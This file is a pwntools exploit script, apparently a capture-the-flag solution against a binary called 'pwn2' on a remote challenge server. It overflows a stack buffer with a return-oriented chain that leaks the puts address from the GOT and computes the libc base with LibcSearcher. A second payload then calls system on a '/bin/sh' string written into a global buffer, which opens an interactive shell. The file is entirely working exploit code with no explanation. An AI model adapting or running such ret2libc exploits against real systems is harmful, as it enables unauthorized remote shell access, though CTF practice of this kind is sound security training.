from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
# p=process('./pwn2')
p=remote('t.ctf.qwq.cc',49247)
elf=ELF('./pwn2')
pop_rdi=0x0000000000400723              # ROPgadget --binary pwn2 --only 'pop|ret'
name_addr=0x0000000000601080
main_addr=0x0000000000400636
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
p.recvuntil(b'tell me your name\n')
p.sendline(b'aa')
p.recvuntil(b'What do you want to say to me?\n')
payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(payload)
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))
libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump('puts')
print(hex(libcbase))
system_addr=libcbase+libc.dump('system')
bin_sh_addr=libcbase+libc.dump('str_bin_sh')
p.recvuntil(b'tell me your name\n')
p.sendline(b'/bin/sh\x00')
p.recvuntil(b'What do you want to say to me?\n')
payload2=b'a'*0x28+p64(pop_rdi)+p64(name_addr)+p64(system_addr)+p64(main_addr)
p.sendline(payload2)

p.interactive()